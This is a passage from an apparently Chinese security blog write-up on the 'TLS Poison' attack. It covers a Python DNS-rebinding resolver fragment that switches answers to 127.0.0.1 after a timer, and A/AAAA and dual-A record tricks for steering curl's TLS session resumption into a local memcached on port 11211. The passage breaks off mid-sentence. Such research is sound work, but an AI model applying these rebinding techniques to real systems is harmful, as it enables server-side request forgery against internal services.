class="hljs-number">3</span></span><br><span class="line">            <span class="hljs-comment"># The below line will result in the answer switching after 30 seconds,</span></span><br><span class="line">            <span class="hljs-comment"># instead of alternating</span></span><br><span class="line">            <span class="hljs-keyword">return</span> d[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> (time() - start &gt; <span class="hljs-number">30</span>) <span class="hljs-keyword">else</span> args.TARGET</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8BA9;&#x6211;&#x4EEC;&#x518D;&#x6765;&#x56DE;&#x987E;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#xFF1A;&#x55EF;&#xFF0C;&#x5199;&#x7684;&#x975E;&#x5E38;&#x7684;&#x68D2;&#xFF0C;&#x7528;<code>time()</code>&#x8BA1;&#x65F6;&#xFF0C;&#x8D85;&#x8FC7; 30s &#x5C31;&#x8FD4;&#x56DE;&#x76EE;&#x6807; IP &#xFF0C;&#x592A;&#x5BF9;&#x4E86;&#x54E5;&#x3002;&#x5982;&#x679C;&#x8FD8;&#x6CA1;&#x770B;&#x51FA;&#x6765;&#x7684;&#x540C;&#x5B66;&#xFF0C;&#x6211;&#x518D;&#x7B80;&#x5316;&#x4E00;&#x4E0B;&#xFF1A;</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">spoof_count = <span class="hljs-number">0</span></span><br><span class="line">start = time()</span><br><span class="line">last_ip = <span class="hljs-literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_spoofed_IP</span><span class="hljs-params">(domain, ip)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">global</span> spoof_count</span><br><span class="line">    <span class="hljs-keyword">global</span> start</span><br><span class="line">    <span class="hljs-keyword">global</span> last_ip</span><br><span class="line">    start = time()</span><br><span class="line">    <span class="hljs-keyword">if</span> time() - start &gt; <span class="hljs-number">30</span>:</span><br><span class="line">    <span class="hljs-keyword">return</span> d[<span class="hljs-number">1</span>]</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">    <span class="hljs-keyword">return</span> args.TARGET</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x89C9;&#x5F97;&#x53EA;&#x8981;&#x4F60;&#x7684;&#x673A;&#x5668;&#x7A0D;&#x5FAE;&#x6B63;&#x5E38;&#x4E00;&#x70B9;&#xFF0C;&#x6B63;&#x5E38;&#x6267;&#x884C;&#x51E0;&#x884C;&#x8D4B;&#x503C;&#x8BED;&#x53E5;&#x7684; python &#x4EE3;&#x7801;&#x7684;&#x901F;&#x5EA6;&#x5E94;&#x8BE5;&#x4E0D;&#x4F1A;&#x8D85;&#x8FC7; 30s &#x5427;&#xFF1F;&#x8FD9;&#x4E2A;&#x5728;&#x4F7F;&#x7528;<code>time()</code>&#x51FD;&#x6570;&#x5BF9;<code>start</code>&#x53D8;&#x91CF;&#x8D4B;&#x503C;&#x4E4B;&#x540E;&#xFF0C;&#x53C8;&#x4F7F;&#x7528;&#x4E86;<code>time()</code>&#x51FD;&#x6570;&#x83B7;&#x53D6;&#x65F6;&#x95F4;&#x6233;&#x4E0E;<code>start</code>&#x53D8;&#x91CF;&#x76F8;&#x51CF;&#x3002;&#x554A;&#x8FD9;&#xFF0C;&#x53CD;&#x6B63;&#x6211;&#x7684;&#x673A;&#x5668;&#x662F;&#x51CF;&#x4E0D;&#x51FA; 30s &#xFF0C;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x5C31;&#x8BA9;&#x6211;&#x611F;&#x89C9;&#x5230;&#x4F5C;&#x8005;&#x5199;&#x7684;&#x975E;&#x5E38;&#x7684;&#x79BB;&#x8C31;&#x2026;&#x5F53;&#x7136;&#x8FD9;&#x91CC;&#x7EAF;&#x5C5E;&#x4E2A;&#x4EBA;&#x5410;&#x69FD;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x628A;&#x51FD;&#x6570;&#x5185;&#x5BF9;&#x4E8E;<code>start</code>&#x53D8;&#x91CF;&#x518D;&#x6B21;&#x8D4B;&#x503C;&#x7684;&#x64CD;&#x4F5C;&#x5220;&#x9664;&#x5C31;&#x884C;&#x4E86;&#xFF0C;&#x8FD9;&#x6837;<code>start</code>&#x5F97;&#x5230;&#x7684;&#x65F6;&#x95F4;&#x5C31;&#x662F;&#x7A0B;&#x5E8F;&#x542F;&#x52A8;&#x7684;&#x65F6;&#x95F4;&#x4E86;&#x3002;&#xFF08;&#x9664;&#x975E;&#x6211;&#x54EA;&#x91CC;&#x8BEF;&#x89E3;&#x4E86;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#xFF09;</p><p>&#x5F53;&#x7136;&#x6211;&#x5EFA;&#x8BAE;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x5728; 10s &#x8FD9;&#x6837;&#x5C31;&#x884C;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x80FD;&#x6BD4;&#x8F83;&#x7CBE;&#x51C6;&#x7684;&#x8BA9; curl &#x5728;&#x7B2C;&#x4E8C;&#x6B21; DNS &#x67E5;&#x8BE2;&#x7684;&#x65F6;&#x5019;&#x62FF;&#x5230; 127.0.0.1 &#x7684;&#x54CD;&#x5E94;&#x4E86;&#x3002;&#xFF08;&#x4E00;&#x53EA;&#x9EC4;&#x8272;&#x7684;&#x54C6;&#x5566;A&#x68A6;&#xFF1A;&#x8FD9;&#x4EBA;&#x4E5F;&#x592A;&#x83DC;&#x4E86;.jpg</p><p>&#x5F53;&#x7136;&#xFF0C;&#x6216;&#x8005;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x603B;&#x6B21;&#x6570;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x5982;&#x679C;&#x603B;&#x6B21;&#x6570;&#x8D85;&#x8FC7;&#x4E00;&#x6B21;&#x7ACB;&#x5373;&#x8FD4;&#x56DE; 127.0.0.1 &#x4E5F;&#x662F;&#x53EF;&#x4EE5;&#x7684;&#xFF0C;&#x4E0D;&#x8FC7;&#x4E07;&#x4E00;&#x88AB;&#x522B;&#x4EBA;&#x67E5;&#x4E86;&#x7B2C;&#x4E00;&#x6B21;&#x5C31;&#x5C34;&#x5C2C;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#x4E0D;&#x4F1A;&#x3002;</p><h3 id="The-Optimization-Method-OF-DNS-Rebinding"><a href="#The-Optimization-Method-OF-DNS-Rebinding" class="headerlink" title="The Optimization Method OF DNS Rebinding"></a>The Optimization Method OF DNS Rebinding</h3><p>&#x5C31;&#x50CF;&#x6211;&#x4EEC;&#x4E0A;&#x6587;&#x6240;&#x63D0;&#x5230;&#x7684;&#xFF0C;&#x8FD9;&#x4E2A;&#x653B;&#x51FB;&#x4E3B;&#x8981;&#x53D6;&#x51B3;&#x4E8E;&#x4E24;&#x4E2A;&#x70B9;&#xFF0C;&#x4E00;&#x4E2A;&#x662F; TLS Session Resumption &#xFF0C;&#x53E6;&#x4E00;&#x4E2A;&#x5C31;&#x662F; DNS Rebinding &#x3002;&#x4E00;&#x4E2A;&#x597D;&#x7684; DNS Rebinding &#x53EF;&#x4EE5;&#x8D77;&#x5230;&#x4E8B;&#x534A;&#x529F;&#x500D;&#x7684;&#x6548;&#x679C;&#x3002;</p><p>&#x6211;&#x8BE2;&#x95EE;&#x4E86;&#x4E00;&#x4E9B; CTFer &#xFF0C;&#x4E5F;&#x67E5;&#x8BC1;&#x4E86;&#x4E00;&#x4E9B; DNS Rebinding &#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x8BF8;&#x5982; <a href="https://github.com/taviso/rbndr" target="_blank" rel="noopener">rbndr</a> / ceye &#x7B49;&#x6BD4;&#x8F83;&#x5E38;&#x7528;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x4E00;&#x822C;&#x7EDF;&#x4E00;&#x505A;&#x6CD5;&#x90FD;&#x662F;&#x6BCF;&#x6B21;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A; TTL &#x8F83;&#x5C0F;&#x7684; A &#x8BB0;&#x5F55;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x6BCF;&#x6B21;&#x8FD4;&#x56DE;&#x7684;&#x8BB0;&#x5F55;&#x4E0D;&#x540C;&#xFF0C;&#x5927;&#x90E8;&#x5206;&#x90FD;&#x662F;&#x5728;&#x7528;&#x6237;&#x6307;&#x5B9A;&#x7684; A &#x8BB0;&#x5F55;&#x5F53;&#x4E2D;&#x968F;&#x673A;&#x6982;&#x7387;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x3002;&#x8FD9;&#x6837;&#x5982;&#x679C;&#x4F7F;&#x7528;&#x8FD9;&#x4E9B; DNS Rebinding &#x5DE5;&#x5177;&#x5728;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x975E;&#x5E38;&#x597D;&#x7684;&#x9009;&#x62E9;&#x3002;</p><p>&#x968F;&#x540E;&#xFF0C;@zhaojin &#x5728; <a href="https://www.zhaoj.in/read-6681.html" target="_blank" rel="noopener">&#x57FA;&#x4E8E; A &#x548C; AAAA &#x8BB0;&#x5F55;&#x7684;&#x4E00;&#x79CD;&#x65B0; DNS Rebinding &#x59FF;&#x52BF;&#x2013;&#x4ECE;&#x897F;&#x6E56;&#x8BBA;&#x5251;2020 Web HelloDiscuzQ &#x9898;&#x5BF9; Blackhat &#x4E0A;&#x7684;&#x8BAE;&#x9898;&#x505A;&#x5347;&#x534E;</a> &#x63D0;&#x5230;&#x65B0;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x4F3C;&#x4E4E;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x57DF;&#x540D;&#x540C;&#x65F6;&#x5206;&#x914D;&#x4E00;&#x4E2A; A &#x8BB0;&#x5F55;&#x8DDF;&#x4E00;&#x4E2A; AAAA &#x8BB0;&#x5F55;&#xFF0C;&#x56E0;&#x4E3A; curl &#x4F1A;&#x4F18;&#x5148;&#x4F7F;&#x7528; AAAA &#x8BB0;&#x5F55;&#xFF0C;&#x800C;&#x5F53; AAAA &#x8BB0;&#x5F55;&#x7684; IPv6 &#x65E0;&#x6CD5;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#x65F6;&#xFF0C;&#x4F1A;&#x5C1D;&#x8BD5;&#x8DDF; A &#x8BB0;&#x5F55;&#x7684; IPv4 &#x8FDB;&#x884C;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#x3002;&#x6211;&#x89C9;&#x5F97;&#x662F;&#x4E2A;&#x5F88;&#x6709;&#x8DA3;&#x7684;&#x60F3;&#x6CD5;&#xFF0C;&#x6574;&#x4E2A;&#x601D;&#x8DEF;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#xFF1A;</p><ul><li>&#x7B2C;&#x4E00;&#x6B21;&#x8BA9; curl &#x53BB;&#x8BBF;&#x95EE;&#x6076;&#x610F;&#x7684; HTTPS &#x670D;&#x52A1;&#x5668;&#xFF0C;&#x62FF;&#x5230;&#x4E00;&#x4E2A;&#x6076;&#x610F;&#x7684; SessionID</li><li>&#x7136;&#x540E;&#x4F7F;&#x6076;&#x610F;&#x7684; HTTPS &#x670D;&#x52A1;&#x5668;&#x65E0;&#x6CD5;&#x63A5;&#x6536;&#x65B0;&#x7684;&#x8FDE;&#x63A5;</li><li>&#x8FD9;&#x65F6;&#x6076;&#x610F;&#x7684; HTTPS &#x7ED9;&#x51FA;&#x7B2C;&#x4E00;&#x6B21;&#x8FD4;&#x56DE;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x4F7F;&#x5176;&#x8FDB;&#x884C;&#x540C;&#x57DF;&#x540D;&#x8DF3;&#x8F6C;</li><li>&#x8DF3;&#x8F6C;&#x65F6;&#x4F1A;&#x5C1D;&#x8BD5;&#x8FDB;&#x884C;&#x65B0;&#x8FDE;&#x63A5;&#xFF0C;&#x53D1;&#x73B0;&#x6076;&#x610F;&#x7684; HTTPS &#x670D;&#x52A1;&#x5668;&#x65E0;&#x6CD5;&#x8FDE;&#x63A5;&#x3002;</li><li>&#x5219;&#x4F1A;&#x5C1D;&#x8BD5;&#x8FDE;&#x63A5;&#x8FD9;&#x4E2A;&#x57DF;&#x540D;&#x4E0B;&#x7684;&#x5176;&#x4ED6;&#x8BB0;&#x5F55;&#x6240;&#x6307;&#x5411;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x5E26;&#x4E0A; SessionID</li></ul><blockquote><p>&#x200B;    &#x5728; CURL &#x4E2D;&#xFF0C;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x57DF;&#x540D;&#xFF0C;&#x5982;&#x679C;&#x540C;&#x65F6;&#x5177;&#x6709; A &#x8BB0;&#x5F55;&#x548C; AAAA &#x8BB0;&#x5F55;&#xFF0C;&#x90A3;&#x4E48; CURL &#x4F1A;&#x53BB;&#x4F18;&#x5148;&#x8BF7;&#x6C42; AAAA &#x6216;&#x8005; A &#x8BB0;&#x5F55;&#x6240;&#x6307;&#x5411;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x5982;&#x679C;&#x8FD9;&#x4E9B;&#x5730;&#x5740;&#x65E0;&#x6CD5;&#x8FDE;&#x63A5;&#xFF0C;&#x5219;&#x4F1A;&#x5C1D;&#x8BD5;&#x8FDE;&#x63A5;&#x540C;&#x65F6;&#x5F97;&#x5230;&#x7684; A &#x8BB0;&#x5F55;&#x6216;&#x8005; AAAA &#x8BB0;&#x5F55;&#x3002;</p><p>&#x5728;&#x67D0;&#x4E9B;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4F1A;&#x51FA;&#x73B0;&#xFF1A;</p><p>AAAA &#x8BB0;&#x5F55;&#x5730;&#x5740;&#x4E0D;&#x901A;&#xFF0C;&#x4F1A;&#x8FDE;&#x63A5;&#x5230; A &#x8BB0;&#x5F55;&#x5730;&#x5740;&#x4E0A;&#x3002;</p><p>A&#x8BB0;&#x5F55;&#x5730;&#x5740;&#x4E0D;&#x901A;&#xFF0C;&#x4F1A;&#x8FDE;&#x63A5;&#x5230; AAAA &#x8BB0;&#x5F55;&#x5730;&#x5740;&#x4E0A;&#x3002;</p></blockquote><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://www.zhaoj.in/wp-content/uploads/2020/10/1602817765b4f463b4513262746c16fe6f1b72278f-1024x377.png" alt></p><p>&#x4F46;&#x662F;&#x6BD4;&#x8F83;&#x9057;&#x61BE;&#x7684;&#x662F;&#xFF0C;&#x5982;&#x679C;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x57DF;&#x540D;&#x8FDB;&#x884C;&#x8FD9;&#x6837;&#x7684;&#x8BBE;&#x7F6E;&#xFF0C;AAAA &#x8BB0;&#x5F55;&#x6307;&#x5411; TLS VPS &#x7684; IPv6 &#x5730;&#x5740;&#x4E0A;&#xFF0C;A &#x8BB0;&#x5F55;&#x6307;&#x5411; 127.0.0.1 &#x5730;&#x5740;&#xFF0C;&#x5B9E;&#x9645;&#x6D4B;&#x8BD5; &#x5F53;&#x4E2D;&#xFF0C; curl &#x603B;&#x662F;&#x4F18;&#x5148; 127.0.0.1 &#xFF0C;&#x5E76;&#x4E14;&#x6CA1;&#x6709;&#x968F;&#x673A;&#x7684;&#x505A;&#x6CD5;&#xFF1B;&#x5982;&#x679C;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x57DF;&#x540D;&#x8FDB;&#x884C;&#x8FD9;&#x6837;&#x7684;&#x8BBE;&#x7F6E;&#xFF0C;AAAA &#x8BB0;&#x5F55;&#x6307;&#x5411; ::1 &#x5730;&#x5740;&#x4E0A;&#xFF0C;A &#x8BB0;&#x5F55;&#x6307;&#x5411; TLS VPS &#x7684; IPv4 &#x5730;&#x5740;&#x4E0A;&#xFF0C;curl &#x603B;&#x662F;&#x4F18;&#x5148; ::1 </p><blockquote class="colorquote success"><p>2021/05/14 &#x66F4;&#x65B0;&#xFF1A;</p><p>&#x611F;&#x8C22; @chuye &#x6307;&#x51FA;&#x6B64;&#x5904;&#x9519;&#x8BEF;&#xFF0C;&#x539F;&#x6587;&#x5DF2;&#x66F4;&#x6B63;&#x3002;</p><p>&#x4E4B;&#x524D;&#x7684;&#x9519;&#x8BEF;&#xFF1A;</p><p>&#x5982;&#x679C;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x57DF;&#x540D;&#x8FDB;&#x884C;&#x8FD9;&#x6837;&#x7684;&#x8BBE;&#x7F6E;&#xFF0C;AAAA &#x8BB0;&#x5F55;&#x6307;&#x5411; ::ffff:127.0.0.1 &#x6216;&#x8005; ::1 &#x5730;&#x5740;&#x4E0A;&#xFF0C;A &#x8BB0;&#x5F55;&#x6307;&#x5411; TLS VPS &#x7684; IPv4 &#x5730;&#x5740;&#x4E0A;&#xFF0C;&#x867D;&#x7136;&#x4F3C;&#x4E4E;&#x53EF;&#x4EE5;&#x505A;&#x5230; curl &#x56E0;&#x4F18;&#x5148; AAAA &#x8BB0;&#x5F55;&#x4E0E; TLS VPS &#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#x83B7;&#x5F97;&#x6076;&#x610F; Session ID &#xFF0C;&#x4F46;&#x662F;&#x5B9E;&#x9645;&#x6D4B;&#x8BD5;&#x9ED8;&#x8BA4; memcached &#x914D;&#x7F6E;&#xFF0C;&#x65E0;&#x6CD5;&#x901A;&#x8FC7;&#x8FD9;&#x4E24;&#x4E2A;(::ffff:127.0.0.1 &#x6216;&#x8005; ::1)&#x5730;&#x5740;&#x8FDB;&#x884C;&#x5199;&#x5165; memcached &#x3002;</p><p>&#x66F4;&#x6B63;&#xFF1A;curl &#x4EE5; ::1 &#x4F18;&#x5148;&#xFF0C;&#x800C;&#x4E14;&#x539F;&#x6765;&#x7684;&#x8BED;&#x5E8F;&#x4EA7;&#x751F;&#x4E86;&#x9519;&#x8BEF;&#x3002;&#x4EE5;&#x53CA; Memcached &#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x63A5;&#x53D7;&#x4ECE; ::ffff:127.0.0.1 &#x6216;&#x8005; ::1 &#x5199;&#x5165;&#x7684;&#xFF0C;&#x8BE6;&#x89C1; <a href="#IPv4-Mapped-With-Memcached">Additional Remarks</a></p></blockquote><p>&#x867D;&#x7136;&#x6709;&#x4E9B;&#x9057;&#x61BE;&#x65E0;&#x6CD5;&#x590D;&#x73B0; @zhaojin &#x6240;&#x8BF4;&#x7684;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x89C9;&#x5F97;&#x662F;&#x4E2A;&#x5F88;&#x6709;&#x8DA3;&#x7684;&#x60F3;&#x6CD5;&#xFF0C;&#x4EE5;&#x53CA; @Ivan Komarov &#x63D0;&#x5230; DNS &#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x57DF;&#x540D;&#x53EF;&#x4EE5;&#x8FD4;&#x56DE;&#x53CC; A &#x8BB0;&#x5F55;&#xFF0C;&#x4E5F;&#x80FD;&#x6709;&#x7C7B;&#x4F3C;&#x7684;&#x6548;&#x679C;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8FD9;&#x6837;&#x8FDB;&#x884C;&#x5C1D;&#x8BD5;&#xFF1A;</p><ul><li>&#x9996;&#x5148;&#xFF0C;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x4E0B;&#xFF0C; &#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; 0.0.0.0:11211 &#x8FD9;&#x4E2A;&#x5730;&#x5740;&#x4E0E; memcached &#x901A;&#x4FE1;</li><li>&#x5BF9;&#x4E8E;&#x8FD4;&#x56DE;&#x7684;&#x53CC; A &#x8BB0;&#x5F55;&#xFF0C;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x4E3A; TLS VPS IP &#xFF0C;&#x53E6;&#x4E00;&#x4E2A;&#x4E3A; 0.0.0.0 &#xFF0C;curl &#x6BCF;&#x6B21;&#x90FD;&#x4F1A;&#x4F18;&#x5148;&#x4F7F;&#x7528; TLS VPS IP &#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x80FD;&#x901A;&#x4FE1;&#x624D;&#x4F1A;&#x63A5;&#x7740;&#x4F7F;&#x7528; 0.0.0.0:11211</li></ul><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/4.png" alt></p><p>&#x90A3;&#x6839;&#x636E;&#x5DF2;&#x77E5;&#x4FE1;&#x606F;&#xFF0C;&#x90A3;&#x4E48;&#x4E0E;&#x4E0A;&#x6587;&#x7684;&#x505A;&#x6CD5;&#x7C7B;&#x4F3C;&#xFF0C;&#x6211;&#x4EEC;&#x662F;&#x4E0D;&#x662F;&#x4E5F;&#x53EF;&#x4EE5;&#x8BA9; curl 